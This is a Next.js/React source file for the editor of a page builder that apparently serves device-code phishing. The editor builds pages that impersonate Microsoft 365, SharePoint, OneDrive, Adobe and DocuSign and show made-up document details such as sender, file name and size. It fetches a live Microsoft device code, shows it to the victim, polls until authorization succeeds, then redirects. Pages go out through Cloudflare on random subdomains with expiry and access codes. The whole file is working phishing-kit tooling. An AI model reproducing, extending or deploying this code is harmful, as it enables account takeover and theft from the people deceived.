"use client";
/* eslint-disable @next/next/no-img-element -- authenticated project assets and sandboxed previews */

import {
  Check, ChevronDown, Cloud, Copy, ExternalLink, History, ImageIcon,
  Laptop, Monitor, RefreshCw, Save, Send, Smartphone,
} from "lucide-react";
import Link from "next/link";
import { useSearchParams } from "next/navigation";
import QRCode from "qrcode";
import { FormEvent, type MouseEvent, useCallback, useEffect, useMemo, useRef, useState } from "react";

import { api } from "@/components/api";
import { Drawer, Skeleton, StatusBadge, useToast } from "@/components/design-system";
import { LogoLibrary, type BrandAsset, type LogoChoice } from "@/components/logo-library";
import { buildPageDesign, defaultBuilderConfiguration, pageDesigns, providerProfiles, type PreviewState } from "@/lib/builder-designs";
import { isSafeRedirectUrl, renderPageDocument, type BuilderConfiguration, type PageDocument } from "@/lib/page-document";
import { providerAssets } from "@/lib/provider-assets";

type Version = { id: string; version: number; document: PageDocument | null; html: string; css: string | null; javascript: string | null; state: string; editorId: string | null; createdAt: string };
type Deployment = { id: string; hostname: string; status: string };
type Project = { id: string; name: string; slug: string; status: string; templateId: string; versions: Version[]; deployments: Deployment[] };
type Viewport = "desktop" | "tablet" | "mobile";
type CloudflareStatus = { configured: boolean; credentialsSaved: boolean; authType: "API_TOKEN" | "GLOBAL_API_KEY" | null; accountId: string | null; accountName: string | null; zoneId: string | null; zoneName: string | null; baseDomain: string | null; credential: string };
type Account = { id: string; name: string };
type Zone = { id: string; name: string; status: string; account: { id: string; name: string } };
type PreviewMode = "design" | "live";
type LiveAuthorization = { sessionId: string; statusToken: string; userCode: string | null; verificationUri: string | null; expiresAt: string; status: string };

export function HtmlEditor({ projectId }: { projectId: string }) {
  const { notify } = useToast();
  const searchParams = useSearchParams();
  const loaded = useRef(false);
  const liveStarting = useRef(false);
  const [project, setProject] = useState<Project | null>(null);
  const [brandAssets, setBrandAssets] = useState<BrandAsset[]>([]);
  const [configuration, setConfiguration] = useState<BuilderConfiguration>(defaultBuilderConfiguration());
  const [viewport, setViewport] = useState<Viewport>("desktop");
  const [previewMode, setPreviewMode] = useState<PreviewMode>("design");
  const [liveAuthorization, setLiveAuthorization] = useState<LiveAuthorization | null>(null);
  const [liveLoading, setLiveLoading] = useState(false);
  const [liveError, setLiveError] = useState("");
  const [dirty, setDirty] = useState(false);
  const [saving, setSaving] = useState(false);
  const [publishOpen, setPublishOpen] = useState(false);
  const [historyOpen, setHistoryOpen] = useState(false);
  const [logoLibrarySlot, setLogoLibrarySlot] = useState<"provider" | "company" | null>(null);

  const load = useCallback(async () => {
    try {
      const [projectResult, assetResult] = await Promise.all([
        api<{ project: Project }>(`/html-projects/${projectId}`),
        api<{ assets: BrandAsset[] }>("/brand-assets"),
      ]);
      setProject(projectResult.project);
      setBrandAssets(assetResult.assets);
      if (!loaded.current) {
        const latest = projectResult.project.versions[0];
        const saved = latest?.document?.settings.builder;
        const defaults = defaultBuilderConfiguration(saved?.layoutId ?? normalizeLayout(projectResult.project.templateId), saved?.provider ?? "microsoft365");
        const defaultCompany = assetResult.assets.find((asset) => asset.isDefault && !asset.archivedAt);
        const savedCompany = assetResult.assets.find((asset) => asset.id === saved?.companyLogoAssetId && !asset.archivedAt);
        const companyLogoAssetId = savedCompany?.id ?? defaultCompany?.id;
        setConfiguration({ ...defaults, ...saved, companyLogoAssetId, logoMode: companyLogoAssetId ? (saved?.logoMode === "none" || saved?.logoMode === "provider" ? saved.logoMode : "both") : "provider" });
        loaded.current = true;
      }
    } catch (error) {
      notify({ title: "Builder unavailable", message: error instanceof Error ? error.message : undefined, tone: "error" });
    }
  }, [notify, projectId]);
  useEffect(() => { void load(); }, [load]);
  useEffect(() => { if (searchParams.get("publish") === "true") setPublishOpen(true); }, [searchParams]);

  const liveState = mapLiveState(liveAuthorization?.status);
  const activePreviewState: PreviewState = previewMode === "live" ? liveState : "waiting";
  const previewDocument = useMemo(() => buildPageDesign(configuration, activePreviewState), [configuration, activePreviewState]);
  const rendered = useMemo(() => renderPageDocument(previewDocument, { deviceCode: previewMode === "live" ? liveAuthorization?.userCode ?? "—" : "XXXX-XXXX", verificationUri: previewMode === "live" ? liveAuthorization?.verificationUri ?? "#" : "#", status: activePreviewState, assetUrl: (id) => `/api/v1/brand-assets/${id}/content` }), [activePreviewState, liveAuthorization?.userCode, liveAuthorization?.verificationUri, previewDocument, previewMode]);
  const orderedDesigns = useMemo(() => {
    const recommended = providerAssets[configuration.provider].recommendedLayouts;
    const rank = (id: BuilderConfiguration["layoutId"]) => { const index = recommended.indexOf(id); return index < 0 ? 99 : index; };
    return [...pageDesigns].sort((a, b) => rank(a.id) - rank(b.id));
  }, [configuration.provider]);

  const startLivePreview = useCallback(async (replacementSessionId?: string) => {
    if (liveStarting.current) return;
    liveStarting.current = true; setLiveLoading(true); setLiveError("");
    if (replacementSessionId) setLiveAuthorization((current) => current ? { ...current, status: "PENDING" } : current);
    try {
      const result = await api<{ statusToken: string; session?: Omit<LiveAuthorization, "statusToken"> }>("/microsoft/device/start", { method: "POST", body: JSON.stringify({ pageProjectId: projectId, replacementSessionId }) });
      if (!result.session?.userCode) throw new Error("Microsoft did not return a device code");
      setLiveAuthorization({ ...result.session, statusToken: result.statusToken });
    } catch (error) {
      setLiveError(error instanceof Error ? error.message : "Live authorization is unavailable");
    } finally { liveStarting.current = false; setLiveLoading(false); }
  }, [projectId]);

  useEffect(() => {
    if (previewMode === "live" && !liveAuthorization && !liveError) void startLivePreview();
  }, [liveAuthorization, liveError, previewMode, startLivePreview]);
  useEffect(() => {
    if (previewMode !== "live" || !liveAuthorization || ["CONNECTED", "EXPIRED", "FAILED", "CANCELLED"].includes(liveAuthorization.status)) return;
    const poll = window.setInterval(() => {
      void api<{ authorization: { userCode: string | null; verificationUri: string | null; expiresAt: string; status: string } }>(`/microsoft/device/${liveAuthorization.sessionId}/status?token=${encodeURIComponent(liveAuthorization.statusToken)}`).then(({ authorization }) => {
        setLiveError("");
        setLiveAuthorization((current) => current ? { ...current, ...authorization } : current);
      }).catch(() => undefined);
    }, 3000);
    return () => window.clearInterval(poll);
  }, [liveAuthorization, previewMode]);
  useEffect(() => {
    if (previewMode !== "live" || !liveAuthorization) return;
    if (["EXPIRED", "FAILED", "CANCELLED"].includes(liveAuthorization.status)) {
      void startLivePreview(liveAuthorization.sessionId);
      return;
    }
    if (liveAuthorization.status !== "PENDING") return;
    const delay = Math.max(0, new Date(liveAuthorization.expiresAt).getTime() - Date.now() - 30_000);
    const timer = window.setTimeout(() => void startLivePreview(liveAuthorization.sessionId), delay);
    return () => window.clearTimeout(timer);
  }, [liveAuthorization, previewMode, startLivePreview]);

  function change(patch: Partial<BuilderConfiguration>) {
    setConfiguration((current) => ({ ...current, ...patch }));
    setDirty(true);
  }
  function changeProvider(provider: BuilderConfiguration["provider"]) {
    const oldDefaults = defaultBuilderConfiguration(configuration.layoutId, configuration.provider);
    const nextLayout = providerAssets[provider].defaultLayout;
    const nextDefaults = defaultBuilderConfiguration(nextLayout, provider);
    change({
      provider,
      layoutId: nextLayout,
      primaryColor: providerProfiles[provider].color,
      background: providerAssets[provider].surface,
      title: configuration.title === oldDefaults.title ? nextDefaults.title : configuration.title,
      description: configuration.description === oldDefaults.description ? nextDefaults.description : configuration.description,
      steps: nextDefaults.steps,
      continueButtonText: nextDefaults.continueButtonText,
      footer: nextDefaults.footer,
      successMessage: nextDefaults.successMessage,
      documentName: configuration.documentName === oldDefaults.documentName ? nextDefaults.documentName : configuration.documentName,
      documentTitle: configuration.documentTitle === oldDefaults.documentTitle ? nextDefaults.documentTitle : configuration.documentTitle,
      fileType: configuration.fileType === oldDefaults.fileType ? nextDefaults.fileType : configuration.fileType,
      fileSize: configuration.fileSize === oldDefaults.fileSize ? nextDefaults.fileSize : configuration.fileSize,
      pageCount: configuration.pageCount === oldDefaults.pageCount ? nextDefaults.pageCount : configuration.pageCount,
      documentStatus: configuration.documentStatus === oldDefaults.documentStatus ? nextDefaults.documentStatus : configuration.documentStatus,
      sender: configuration.sender === oldDefaults.sender ? nextDefaults.sender : configuration.sender,
    });
  }
  function changeLayout(layoutId: BuilderConfiguration["layoutId"]) {
    change({ layoutId, primaryColor: providerAssets[configuration.provider].accent, background: providerAssets[configuration.provider].surface });
  }
  async function save(quiet = false, state: "DRAFT" | "PUBLISHED" = "DRAFT") {
    if (saving) return false;
    if (configuration.redirectUrl && !isSafeRedirectUrl(configuration.redirectUrl)) {
      notify({ title: "Unsafe redirect URL", message: "Use HTTPS, or local HTTP during development.", tone: "error" });
      return false;
    }
    setSaving(true);
    try {
      const document = buildPageDesign(configuration, "waiting");
      await api(`/html-projects/${projectId}/versions`, { method: "POST", body: JSON.stringify({ document, state }) });
      if (project && project.name !== document.settings.title) {
        // Project names remain independent from the public page title.
      }
      setDirty(false);
      await load();
      if (!quiet) notify({ title: state === "PUBLISHED" ? "Published version saved" : "Draft saved", tone: "success" });
      return true;
    } catch (error) {
      notify({ title: "Could not save page", message: error instanceof Error ? error.message : undefined, tone: "error" });
      return false;
    } finally { setSaving(false); }
  }
  useEffect(() => {
    if (!dirty) return;
    if (saving) return;
    const timer = window.setTimeout(() => void save(true), 850);
    return () => window.clearTimeout(timer);
  }, [configuration, dirty, saving]); // eslint-disable-line react-hooks/exhaustive-deps

  function selectLogo(choice: LogoChoice) {
    if (choice.kind === "custom") {
      change({ companyLogoAssetId: choice.asset.id, logoMode: "both" });
    }
  }
  function handlePreviewClick(event: MouseEvent<HTMLDivElement>) {
    const target = (event.target as HTMLElement).closest<HTMLElement>("[data-action]");
    if (!target) return;
    event.preventDefault();
    if (target.dataset.action === "copy-device-code" && previewMode === "live" && liveAuthorization?.userCode) {
      void navigator.clipboard.writeText(liveAuthorization.userCode).then(() => notify({ title: "Copied", tone: "success" })).catch(() => undefined);
    }
    if (target.dataset.action === "open-microsoft" && previewMode === "live" && liveAuthorization?.verificationUri) {
      const popup = window.open(liveAuthorization.verificationUri, "microsoft-auth", "width=520,height=720,resizable=yes,scrollbars=yes");
      if (liveAuthorization.userCode) void navigator.clipboard.writeText(liveAuthorization.userCode).catch(() => undefined);
      if (!popup) notify({ title: "Popup blocked", message: "Use Open Microsoft or allow popups for this site.", tone: "error" });
    }
  }

  if (!project) return <section className="panel panel-body"><Skeleton lines={12} /></section>;
  return <div className="focused-builder">
    <header className="focused-builder-topbar">
      <div className="builder-project-title"><Link href="/admin/html-projects">Page Builder</Link><span>/</span><strong>{project.name}</strong></div>
      <div className="builder-top-actions"><span className={`builder-save-state ${dirty || saving ? "saving" : "saved"}`} aria-live="polite"><i />{dirty || saving ? "Saving…" : "Saved"}</span><button className="secondary" onClick={() => setHistoryOpen(true)}><History size={15} />History</button><button className="secondary" disabled={saving} onClick={() => void save()}><Save size={15} />{saving ? "Saving…" : "Save"}</button><button onClick={() => setPublishOpen(true)}><Send size={15} />Publish</button></div>
    </header>
    <div className="focused-builder-grid">
      <aside className="builder-controls">
        <section className="builder-control-section"><div className="control-heading"><strong>Page</strong><small>Provider styling and layout recommendations are automatic</small></div><label>Provider<select value={configuration.provider === "custom" ? "company" : configuration.provider} onChange={(event) => changeProvider(event.target.value as BuilderConfiguration["provider"])}>{(["microsoft365", "sharepoint", "onedrive", "adobe", "docusign", "company"] as const).map((id) => <option value={id} key={id}>{providerProfiles[id].name}</option>)}</select></label><label>File or resource<input value={configuration.documentName} onChange={(event) => change({ documentName: event.target.value })} /></label><label>Status<input value={configuration.documentStatus} onChange={(event) => change({ documentStatus: event.target.value })} /></label><div className="theme-color-control"><label>Theme color<div><input type="color" value={configuration.primaryColor} onChange={(event) => change({ primaryColor: event.target.value })} /><output>{configuration.primaryColor.toUpperCase()}</output></div><input aria-label="Theme hue" className="hue-dragger" type="range" min="0" max="359" value={hexHue(configuration.primaryColor)} onChange={(event) => change({ primaryColor: hueHex(Number(event.target.value)) })} /></label><button className="secondary button-sm" onClick={() => change({ primaryColor: providerAssets[configuration.provider].accent })}><RefreshCw size={13} />Provider default</button></div></section>
        <details><summary>Company branding <ChevronDown size={14} /></summary><div>
          <label>Company logo<select value={configuration.logoMode === "both" || configuration.logoMode === "company" ? "both" : "provider"} onChange={(event) => change({ logoMode: event.target.value as "provider" | "both" })}><option value="provider">Not shown</option><option value="both">Show with provider identity</option></select></label>
          <div className="selected-logo-row one"><button onClick={() => setLogoLibrarySlot("company")}><SelectedCompanyLogo asset={brandAssets.find((asset) => asset.id === configuration.companyLogoAssetId)} /><span><small>Optional company logo</small><strong>{configuration.companyLogoAssetId ? "Change logo" : "Choose logo"}</strong></span></button></div>
          <Link className="brand-library-link" href="/admin/settings/brand-assets">Manage company brand library</Link>
          <div className="compact-control-grid"><label>Size<select value={configuration.logoSize} onChange={(event) => change({ logoSize: event.target.value as BuilderConfiguration["logoSize"] })}><option value="small">Small</option><option value="medium">Medium</option><option value="large">Large</option></select></label><label>Position<select value={configuration.logoAlignment} onChange={(event) => change({ logoAlignment: event.target.value as BuilderConfiguration["logoAlignment"] })}><option value="left">Left</option><option value="center">Center</option><option value="right">Right</option></select></label></div>
          <label>Logo width · {configuration.logoWidth}px<input type="range" min="80" max="200" value={configuration.logoWidth} onChange={(event) => change({ logoWidth: Number(event.target.value) })} /></label>
        </div></details>
        <details open><summary>Content <ChevronDown size={14} /></summary><div>
          {configuration.steps.map((step, index) => <label key={index}>Step {index + 1}<input value={step} onChange={(event) => { const steps = [...configuration.steps] as BuilderConfiguration["steps"]; steps[index] = event.target.value; change({ steps }); }} /></label>)}
          <label>Continue button<input value={configuration.continueButtonText} onChange={(event) => change({ continueButtonText: event.target.value })} /></label>
          <label>Footer<input value={configuration.footer} onChange={(event) => change({ footer: event.target.value })} /></label>
        </div></details>
        <details><summary>Document details <ChevronDown size={14} /></summary><div>
          <label>Filename<input value={configuration.documentName} onChange={(event) => change({ documentName: event.target.value })} /></label><label>Document title<input value={configuration.documentTitle} onChange={(event) => change({ documentTitle: event.target.value })} /></label>
          <div className="compact-control-grid"><label>File type<input value={configuration.fileType} onChange={(event) => change({ fileType: event.target.value })} /></label><label>Page count<input value={configuration.pageCount} onChange={(event) => change({ pageCount: event.target.value })} /></label><label>File size<input value={configuration.fileSize} onChange={(event) => change({ fileSize: event.target.value })} /></label><label>Status<input value={configuration.documentStatus} onChange={(event) => change({ documentStatus: event.target.value })} /></label></div>
          <label>Sender<input value={configuration.sender} onChange={(event) => change({ sender: event.target.value })} /></label><label>Company<input value={configuration.companyName} onChange={(event) => change({ companyName: event.target.value })} /></label><label>Department<input value={configuration.department} onChange={(event) => change({ department: event.target.value })} /></label>
        </div></details>
        <details open><summary>Behavior <ChevronDown size={14} /></summary><div><label>Redirect after authentication<input type="url" placeholder="https://company.example/document" value={configuration.redirectUrl ?? ""} onChange={(event) => change({ redirectUrl: event.target.value, redirectDelay: "immediate" })} /></label><small className="muted">The original page redirects immediately after the backend confirms authorization.</small></div></details>
        <details><summary>Deployment <ChevronDown size={14} /></summary><div><button onClick={() => setPublishOpen(true)}><Cloud size={14} />Cloudflare publish settings</button></div></details>
      </aside>
      <main className="builder-preview-column">
        <section className="preview-stage"><div className="preview-stage-toolbar"><span><i />{previewMode === "live" ? "Live authorization preview" : "Design preview"}</span><div className="segmented preview-mode-switch"><button className={previewMode === "design" ? "active" : ""} onClick={() => setPreviewMode("design")}>Design</button><button className={previewMode === "live" ? "active" : ""} onClick={() => { setLiveError(""); setPreviewMode("live"); }}>Live</button></div><div className="builder-device-switcher"><button className={viewport === "desktop" ? "active" : ""} onClick={() => setViewport("desktop")} title="Desktop"><Monitor size={16} /></button><button className={viewport === "tablet" ? "active" : ""} onClick={() => setViewport("tablet")} title="Tablet"><Laptop size={16} /></button><button className={viewport === "mobile" ? "active" : ""} onClick={() => setViewport("mobile")} title="Mobile"><Smartphone size={16} /></button></div>{previewMode === "live" && <span className="live-session-state">{liveLoading ? "Starting…" : liveAuthorization ? friendlyStatus(liveAuthorization.status) : "Not started"}</span>}</div>{liveError && <div className="live-preview-error">{liveError}<button className="secondary button-sm" onClick={() => { setLiveError(""); void startLivePreview(liveAuthorization?.sessionId); }}>Retry</button></div>}<div className={`focused-preview preview-${viewport}`}><style>{rendered.css}</style><div className="direct-page-preview" onClick={handlePreviewClick} dangerouslySetInnerHTML={{ __html: rendered.html }} /></div></section>
        <section className="design-carousel"><div><strong>Choose another design</strong><small>Recommended first for {providerProfiles[configuration.provider].name}</small></div><div className="design-carousel-track">{orderedDesigns.map((design) => <button className={configuration.layoutId === design.id ? "selected" : ""} onClick={() => changeLayout(design.id)} key={design.id}><DesignThumbnail configuration={{ ...configuration, layoutId: design.id }} /><span>{design.name}</span>{configuration.layoutId === design.id && <Check size={12} />}</button>)}</div></section>
      </main>
    </div>
    <LogoLibrary open={Boolean(logoLibrarySlot)} assets={brandAssets} onAssetsChange={setBrandAssets} onClose={() => setLogoLibrarySlot(null)} onSelect={selectLogo} />
    <Drawer open={historyOpen} title="Version history" onClose={() => setHistoryOpen(false)}><div className="version-history">{project.versions.map((version) => <article key={version.id}><div><strong>Version {version.version}</strong><StatusBadge status={version.state} /><p>{new Date(version.createdAt).toLocaleString()}</p></div>{version.document?.settings.builder && <button className="secondary button-sm" onClick={() => { setConfiguration(version.document!.settings.builder!); setDirty(true); setHistoryOpen(false); }}>Restore</button>}</article>)}</div></Drawer>
    <PublishDrawer open={publishOpen} project={project} configuration={configuration} onClose={() => setPublishOpen(false)} onSave={() => save(true, "PUBLISHED")} />
  </div>;
}

function SelectedCompanyLogo({ asset }: { asset?: BrandAsset }) { return asset ? <img src={asset.url} alt="" /> : <ImageIcon size={24} />; }

function DesignThumbnail({ configuration }: { configuration: BuilderConfiguration }) {
  const document = buildPageDesign(configuration, "waiting");
  const rendered = renderPageDocument(document, { deviceCode: "XXXX-XXXX" });
  return <span className="mini-design-preview"><iframe title={`${configuration.layoutId} design thumbnail`} sandbox="" srcDoc={`<style>${rendered.css}body{margin:0;overflow:hidden}</style>${rendered.html}`} tabIndex={-1} /></span>;
}

function PublishDrawer({ open, project, configuration, onClose, onSave }: { open: boolean; project: Project; configuration: BuilderConfiguration; onClose: () => void; onSave: () => Promise<boolean> }) {
  const { notify } = useToast();
  const [status, setStatus] = useState<CloudflareStatus | null>(null);
  const [replaceConnection, setReplaceConnection] = useState(false);
  const [authType, setAuthType] = useState<"API_TOKEN" | "GLOBAL_API_KEY">("API_TOKEN");
  const [email, setEmail] = useState("");
  const [credential, setCredential] = useState("");
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [zones, setZones] = useState<Zone[]>([]);
  const [accountId, setAccountId] = useState("");
  const [zoneId, setZoneId] = useState("");
  const [baseDomain, setBaseDomain] = useState("");
  const [saveCredentials, setSaveCredentials] = useState(true);
  const [subdomainMode, setSubdomainMode] = useState<"random" | "custom">("random");
  const [subdomain, setSubdomain] = useState("");
  const [policy, setPolicy] = useState<"PUBLIC" | "PRIVATE" | "ACCESS_CODE">("PUBLIC");
  const [expiration, setExpiration] = useState("never");
  const [customExpiration, setCustomExpiration] = useState("");
  const [testing, setTesting] = useState(false);
  const [publishing, setPublishing] = useState(false);
  const [result, setResult] = useState<{ id: string; hostname: string; accessCode?: string; qr?: string } | null>(null);

  useEffect(() => {
    if (!open) return;
    setResult(null);
    void api<CloudflareStatus>("/cloudflare/configuration").then((value) => {
      setStatus(value); setAuthType(value.authType ?? "API_TOKEN"); setAccountId(value.accountId ?? ""); setZoneId(value.zoneId ?? ""); setBaseDomain(value.baseDomain ?? "");
      setSubdomain(randomLabel());
    }).catch(() => setStatus(null));
  }, [open]);
  const usingSaved = Boolean(status?.configured && !replaceConnection);
  const availableZones = zones.filter((zone) => !accountId || zone.account.id === accountId);
  const liveUrl = subdomain && baseDomain ? `https://${subdomain}.${baseDomain}` : "";

  async function testConnection(event: FormEvent) {
    event.preventDefault(); setTesting(true);
    try {
      const discovered = await api<{ accounts: Account[]; zones: Zone[] }>("/cloudflare/configuration", { method: "POST", body: JSON.stringify({ action: "TEST", authType, email: authType === "GLOBAL_API_KEY" ? email : undefined, credential }) });
      setAccounts(discovered.accounts); setZones(discovered.zones);
      if (discovered.accounts.length === 1) setAccountId(discovered.accounts[0].id);
      notify({ title: "Cloudflare connected", message: `${discovered.accounts.length} account(s), ${discovered.zones.length} zone(s) discovered.`, tone: "success" });
    } catch (error) { notify({ title: "Connection failed", message: error instanceof Error ? error.message : undefined, tone: "error" }); }
    finally { setTesting(false); }
  }
  async function publish() {
    if (!liveUrl) return;
    setPublishing(true);
    try {
      if (!(await onSave())) return;
      const expiresAt = expirationDate(expiration, customExpiration);
      const cloudflare = usingSaved ? undefined : { authType, email: authType === "GLOBAL_API_KEY" ? email : undefined, credential, accountId, zoneId, baseDomain, save: saveCredentials };
      const response = await api<{ deployment: { id: string; hostname: string }; accessCode?: string }>("/cloudflare", { method: "POST", body: JSON.stringify({ projectId: project.id, policy, expiresAt, proposedHostname: `${subdomain}.${baseDomain}`, cloudflare }) });
      const url = `https://${response.deployment.hostname}`;
      setResult({ id: response.deployment.id, hostname: response.deployment.hostname, accessCode: response.accessCode, qr: await QRCode.toDataURL(url, { margin: 1, width: 180, color: { dark: "#172033", light: "#ffffff" } }) });
      notify({ title: "Deployment successful", message: url, tone: "success" });
    } catch (error) { notify({ title: "Publish failed", message: error instanceof Error ? error.message : undefined, tone: "error" }); }
    finally { setPublishing(false); }
  }
  async function startMicrosoftSession() {
    if (!result) return;
    window.open(`https://${result.hostname}`, "_blank", "noopener,noreferrer");
  }
  return <Drawer open={open} title={result ? "Deployment successful" : "Publish & deploy"} onClose={onClose}>
    {result ? <div className="deployment-success"><span className="success-check"><Check size={28} /></span><div><div className="eyebrow">Deployment successful</div><h2>Your page is live</h2><p className="muted">The wildcard Cloudflare router is serving the latest published version.</p></div><div className="published-url"><Cloud size={18} /><span><small>Live URL</small><strong>https://{result.hostname}</strong></span><button className="icon-button" onClick={() => void navigator.clipboard.writeText(`https://${result.hostname}`)}><Copy size={15} /></button></div>{result.qr && <img className="deployment-qr" src={result.qr} alt={`QR code for https://${result.hostname}`} />}{result.accessCode && <div className="access-code-result"><small>Copy this access code now</small><strong>{result.accessCode}</strong></div>}<div className="deployment-success-actions"><button onClick={() => window.open(`https://${result.hostname}`, "_blank", "noopener,noreferrer")}><ExternalLink size={15} />Open page</button><button className="secondary" onClick={() => void startMicrosoftSession()}><ExternalLink size={15} />Start Microsoft session</button><button className="secondary" onClick={() => void navigator.clipboard.writeText(`https://${result.hostname}`)}><Copy size={15} />Copy link</button><button className="secondary" onClick={() => setResult(null)}><RefreshCw size={15} />Republish</button><button className="secondary" onClick={onClose}>Edit page</button></div></div> :
    <div className="publish-workflow">
      <section><div className="publish-section-title"><span>1</span><div><strong>Cloudflare connection</strong><small>Credentials remain backend-only</small></div></div>
        {usingSaved ? <div className="saved-cloudflare"><Cloud size={18} /><div><strong>{status?.zoneName ?? status?.baseDomain}</strong><small>{status?.accountName} · {status?.credential}</small></div><StatusBadge status="Connected" /><button className="secondary button-sm" onClick={() => setReplaceConnection(true)}>Replace</button></div> :
        <form className="compact-cloudflare-form" onSubmit={testConnection}><label>Authentication<select value={authType} onChange={(event) => setAuthType(event.target.value as typeof authType)}><option value="API_TOKEN">API Token — recommended</option><option value="GLOBAL_API_KEY">Global API Key — legacy</option></select></label>{authType === "GLOBAL_API_KEY" && <label>Cloudflare email<input type="email" value={email} onChange={(event) => setEmail(event.target.value)} required /></label>}<label>{authType === "API_TOKEN" ? "API token" : "Global API key"}<input type="password" value={credential} onChange={(event) => setCredential(event.target.value)} minLength={20} required /></label><button disabled={testing}>{testing ? "Testing…" : "Test connection"}</button>{accounts.length > 0 && <><label>Account<select value={accountId} onChange={(event) => { setAccountId(event.target.value); setZoneId(""); }}><option value="">Choose account</option>{accounts.map((account) => <option value={account.id} key={account.id}>{account.name}</option>)}</select></label><label>Domain / Zone<select value={zoneId} onChange={(event) => { setZoneId(event.target.value); const zone = zones.find((item) => item.id === event.target.value); if (zone) setBaseDomain(zone.name); }}><option value="">Choose zone</option>{availableZones.map((zone) => <option value={zone.id} key={zone.id}>{zone.name}</option>)}</select></label><label className="check-row"><input type="checkbox" checked={saveCredentials} onChange={(event) => setSaveCredentials(event.target.checked)} />Save securely for future deployments</label></>}</form>}</section>
      <section><div className="publish-section-title"><span>2</span><div><strong>Address</strong><small>Choose a secure hostname</small></div></div><div className="segmented"><button className={subdomainMode === "random" ? "active" : ""} onClick={() => setSubdomainMode("random")}>Random subdomain</button><button className={subdomainMode === "custom" ? "active" : ""} onClick={() => setSubdomainMode("custom")}>Custom name</button></div><label>Subdomain<div className="input-action"><input value={subdomain} onChange={(event) => setSubdomain(event.target.value.toLowerCase().replace(/[^a-z0-9-]/g, ""))} readOnly={subdomainMode === "random"} />{subdomainMode === "random" && <button className="secondary" onClick={() => setSubdomain(randomLabel())} type="button"><RefreshCw size={14} />Regenerate</button>}</div></label>{baseDomain && <div className="url-preview"><span>{liveUrl}</span><button className="icon-button" onClick={() => void navigator.clipboard.writeText(liveUrl)}><Copy size={14} /></button></div>}</section>
      <section><div className="publish-section-title"><span>3</span><div><strong>Access & expiration</strong><small>Control who can open this page</small></div></div><label>Visibility<select value={policy} onChange={(event) => setPolicy(event.target.value as typeof policy)}><option value="PUBLIC">Public</option><option value="PRIVATE">Private — blocked publicly</option><option value="ACCESS_CODE">Access code protected</option></select></label><label>Expiration<select value={expiration} onChange={(event) => setExpiration(event.target.value)}><option value="never">Never</option><option value="1h">1 hour</option><option value="24h">24 hours</option><option value="7d">7 days</option><option value="custom">Custom</option></select></label>{expiration === "custom" && <label>Custom expiration<input type="datetime-local" value={customExpiration} onChange={(event) => setCustomExpiration(event.target.value)} /></label>}<label>Success redirect<input value={configuration.redirectUrl || "No redirect configured"} readOnly /></label></section>
      <button className="publish-primary" disabled={publishing || !baseDomain || (!usingSaved && (!credential || !accountId || !zoneId)) || !subdomain} onClick={() => void publish()}><Send size={16} />{publishing ? "Publishing…" : "Publish & Deploy"}</button>
    </div>}
  </Drawer>;
}

function normalizeLayout(value: string): BuilderConfiguration["layoutId"] { return pageDesigns.some((design) => design.id === value) ? value as BuilderConfiguration["layoutId"] : "compact-card"; }
function randomLabel() { const alphabet = "abcdefghjkmnpqrstuvwxyz23456789"; const bytes = crypto.getRandomValues(new Uint8Array(7)); return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join(""); }
function expirationDate(value: string, custom: string) { const now = Date.now(); if (value === "1h") return new Date(now + 3_600_000).toISOString(); if (value === "24h") return new Date(now + 86_400_000).toISOString(); if (value === "7d") return new Date(now + 7 * 86_400_000).toISOString(); if (value === "custom" && custom) return new Date(custom).toISOString(); return undefined; }
function mapLiveState(status?: string): PreviewState { return status === "CONNECTED" ? "success" : status === "EXPIRED" ? "expired" : status === "FAILED" || status === "CANCELLED" ? "error" : "waiting"; }
function friendlyStatus(status: string) { return ({ PENDING: "Waiting for Microsoft…", CONNECTED: "Redirect confirmed", EXPIRED: "Waiting for Microsoft…", FAILED: "Waiting for Microsoft…", CANCELLED: "Waiting for Microsoft…", REFRESHING: "Waiting for Microsoft…" } as Record<string, string>)[status] ?? status; }
function hexHue(value: string) {
  const number = Number.parseInt(value.replace("#", ""), 16);
  const r = ((number >> 16) & 255) / 255, g = ((number >> 8) & 255) / 255, b = (number & 255) / 255;
  const max = Math.max(r, g, b), min = Math.min(r, g, b), delta = max - min;
  if (!delta) return 0;
  const hue = max === r ? ((g - b) / delta) % 6 : max === g ? (b - r) / delta + 2 : (r - g) / delta + 4;
  return Math.round((hue * 60 + 360) % 360);
}
function hueHex(hue: number) {
  const saturation = .72, lightness = .47;
  const chroma = (1 - Math.abs(2 * lightness - 1)) * saturation;
  const x = chroma * (1 - Math.abs((hue / 60) % 2 - 1));
  const [r, g, b] = hue < 60 ? [chroma, x, 0] : hue < 120 ? [x, chroma, 0] : hue < 180 ? [0, chroma, x] : hue < 240 ? [0, x, chroma] : hue < 300 ? [x, 0, chroma] : [chroma, 0, x];
  const m = lightness - chroma / 2;
  return `#${[r, g, b].map((channel) => Math.round((channel + m) * 255).toString(16).padStart(2, "0")).join("")}`;
}
